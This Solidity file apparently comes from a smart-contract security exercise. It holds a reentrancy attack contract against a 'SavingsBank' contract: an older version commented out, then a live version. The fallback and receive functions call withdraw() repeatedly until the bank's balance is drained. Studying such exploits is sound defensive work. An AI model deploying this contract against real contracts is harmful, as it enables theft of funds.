// SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.8.1 <0.9.0;

// import "./N-SavingsBank.sol";

// contract Attacker {
//    SavingsBank public savingsStore;

//    constructor(address _savingsStoreAddress) payable {
//        savingsStore = SavingsBank(_savingsStoreAddress);
//    }

    // Fallback is called when SavingsBank sends Ether to this     // contract.
//    fallback() external payable {
//        if (address(savingsStore).balance >= 1 ether) {
//            savingsStore.withdraw();
//        }
//    }

 
//    function attack() external payable {
//        require(msg.value >= 1 ether);
//        savingsStore.deposit{value: 1 ether}();
//        savingsStore.withdraw();
//    }

    // Helper function to check the balance of this contract
//    function getBalance() public view returns (uint) {
//        return address(this).balance;
//    }
//}

pragma solidity ^0.8.4;

import "./N-SavingsBank.sol";

contract Attacker {
    SavingsBank public savingsBank;
    constructor(address _savingsBankAddress) {
        savingsBank = SavingsBank(_savingsBankAddress);
    }
    
    fallback() external payable {
        // send / transfer (forwards 2300 gas to this fallback function)
        // call (forwards all of the gas)
        // emit Log("fallback", gasleft());
        if(address(savingsBank).balance > 0) {
            savingsBank.withdraw();
        }
    }
    
    // Function to receive Ether
    receive() external payable {
        if(address(savingsBank).balance > 0) {
            savingsBank.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        savingsBank.addBalance{value: msg.value}();
        savingsBank.withdraw();	
    }
}
